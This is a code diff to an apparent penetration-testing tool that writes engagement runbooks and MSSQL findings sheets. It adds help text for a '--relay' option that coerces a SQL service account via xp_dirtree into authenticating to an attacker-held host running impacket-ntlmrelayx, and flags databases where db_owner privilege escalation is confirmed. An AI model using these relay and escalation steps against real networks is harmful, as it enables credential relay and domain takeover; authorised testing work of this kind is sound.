@@ -995,6 +995,10 @@ def _build_runbook(wb, meta: dict) -> None:
         "commands without executing nxc/impacket (airgapped-safe).")
     cmd("  --link-depth N / --no-links",
         "Max linked-server chain depth to walk (default 4) / skip the recursive walk.")
+    cmd("  --relay --lhost 10.10.14.5",
+        "Trigger the SQL service account to authenticate to your box (xp_dirtree) so a "
+        "running impacket-ntlmrelayx catches it - relay to the DC's LDAP, another MSSQL, "
+        "or an SMB-signing-off host (targets listed on the MSSQL sheet).")
 
     section("6. Report - turn findings into deliverables")
     cmd("writeups -o eng", "One Word (.docx) write-up per finding (web screenshots "
@@ -1403,7 +1407,10 @@ def _build_mssql(wb, analysis: dict) -> None:
             if live.get("sysadmins"):
                 sh.write(["", "Sysadmins: " + ", ".join(live["sysadmins"][:12])])
             if live.get("trustworthy"):
-                sh.write(["", "TRUSTWORTHY DBs: " + ", ".join(live["trustworthy"][:12])])
+                conf = set(live.get("dbowner_confirmed") or [])
+                sh.write(["", "TRUSTWORTHY DBs: " + ", ".join(
+                    db + (" [db_owner - CONFIRMED privesc]" if db in conf else "")
+                    for db in live["trustworthy"][:12])])
             if live.get("links"):
                 sh.write(["", "Linked servers: " + ", ".join(live["links"][:12])])
             if live.get("impersonate"):
